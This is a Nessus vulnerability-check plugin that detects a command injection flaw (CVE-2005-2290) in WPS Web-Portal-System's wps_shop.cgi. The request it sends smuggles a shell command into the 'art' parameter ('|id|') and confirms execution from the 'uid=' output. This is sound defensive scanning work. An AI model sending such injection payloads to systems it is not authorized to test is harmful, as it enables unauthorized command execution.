#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(19306);
 script_version("$Revision: 1.11 $");
 script_cve_id("CVE-2005-2290");
 script_bugtraq_id(14245);
 script_osvdb_id(17881);
  
 script_name(english:"WPS Web-Portal-System wps_shop.cgi art Parameter Arbitrary Command Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the WPS Web-Portal-System.

The version of this software installed on the remote host is
vulnerable to remote command execution flaw through the argument 'art'
of the script 'wps_shop.cgi'.  A malicious user could exploit this
flaw to execute arbitrary commands on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/405100" );
 script_set_attribute(attribute:"solution", value:
"Disable or delete this script." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/13");
 script_cvs_date("$Date: 2011/03/15 19:26:57 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"Checks for WPS wps_shop.cgi remote command execution flaw");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


http_check_remote_code (
			extra_dirs:make_list("/cgi-bin/wps"),
			check_request:"/wps_shop.cgi?action=showartikel&cat=nessus&catname=nessus&art=|id|",
			extra_check:"<small> WPS v\.[0-9]+\.[0-9]+\.[0-9]+</a><small>",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
